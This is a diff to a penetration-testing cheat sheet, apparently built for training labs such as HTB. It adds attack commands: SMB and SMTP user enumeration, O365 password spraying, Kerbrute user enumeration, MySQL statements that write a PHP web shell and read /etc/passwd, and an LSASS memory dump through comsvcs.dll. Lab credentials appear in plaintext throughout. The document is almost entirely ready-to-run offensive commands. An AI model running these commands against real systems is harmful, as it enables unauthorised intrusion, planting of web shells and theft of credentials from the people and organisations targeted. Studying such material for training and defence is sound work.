@@ -17,6 +17,7 @@ cme smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt
 cme smb 10.10.10.178 -u 'a' -p ''
 rpcclient -U '' -N <ip>
 enumdomusers
+querydispinfo
 hydra -L user.list -P password.list smb://10.129.42.197
 scanner/smb/smb_login
 ```
@@ -71,6 +72,9 @@ sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
 python3 smtp_vrfy_brute.py 10.129.191.82 ~/Documents/seclists/footprinting-wordlist.txt
 smtp-user-enum -V -m RCPT -U ~/Documents/seclists/footprinting-wordlist.txt 10.129.42.195 25
 use auxiliary/scanner/smtp/smtp_enum
+python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
+python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
+smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.122.129
 ```
 ### RDP enumeration
 ```bash
@@ -135,7 +139,7 @@ responder -I tun0
 ### Kerbrute
 ```bash
 nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.real='test.local', userdb=usernames.txt <ip>
-kerbrute userenum --dc 10.10.10.100 -d test.local usernames.txt
+kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
 ```
 ### NTLM Creds
 ```bash
@@ -211,9 +215,18 @@ cme mssql 10.10.10.52 -u user -p 'password' --put-file  --put-file /tmp/users C:
 crackmapexec winrm -u test -p test --continue-on-success 10.10.10.100
 crackmapexec smb --local-auth 10.10.10.10/23 -u user -H hash 
 evil-winrm -i 10.10.10.100 -u test -p password123
+USE nameDb;
+SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
+SELECT * FROM tb_USERS;
 ```
-alex
-lol123!mD
+```
+mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\xampp\htdocs\webshell.php';
+mysql> select LOAD_FILE("/etc/passwd");
+```
+```
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\\xampp\\htdocs\\shell.php';
+select LOAD_FILE("C:\\Users\\Administrator\\Desktop\\flag.txt");
+```
 ## NFS
 ```bash
 showmount -e 10.129.171.59
@@ -222,6 +235,7 @@ sudo umount ~/Documents/target-NFS/
 ```
 ## RDP pth
 ```bash
+xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /drive:linux,/home/pl4int3xt /dynamic-resolution
 xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
 rdesktop -u admin -p password123 192.168.2.143
 HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa   DisableRestrictedAdmin
@@ -239,10 +253,21 @@ A1 SELECT "INBOX"
 1 FETCH 1 all
 1 FETCH 1 BODY[]
 ```
+```bash
+USER username
+PASS password
+LIST
+RETR 1
+QUIT
+```
 [Bluekeep CVE](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708)
 ## WMI
 ```bash
 wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
+```
+## LSASS
+```
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
 ```
 ## INFO GATHERING
 [crt.sh](https://crt.sh)
